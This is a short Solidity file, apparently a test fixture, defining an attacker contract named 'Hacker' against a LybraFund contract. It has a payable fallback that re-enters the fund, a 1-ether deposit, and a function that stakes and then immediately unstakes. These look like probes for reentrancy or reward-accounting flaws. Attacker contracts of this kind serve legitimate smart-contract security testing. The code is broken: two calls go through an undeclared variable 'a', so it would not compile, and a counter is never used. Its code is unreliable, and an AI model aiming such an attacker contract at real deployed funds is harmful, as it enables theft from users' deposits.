// SPDX-License-Identifier: BUSL-1.1

pragma solidity 0.8.17;

import "../lybraFund.sol";

contract Hacker {
    uint256 i = 0;
    LybraFund _fund;

    constructor(LybraFund fund_) {
        _fund = fund_;
    }

    fallback() external payable {
        a.update();
    }

    function deposit() public {
        a.deposit{value: 1 ether}();
    }

    function stake_unstake(uint256 amount) public {
        _fund.stake(amount);
        _fund.unstake(amount);
    }
}
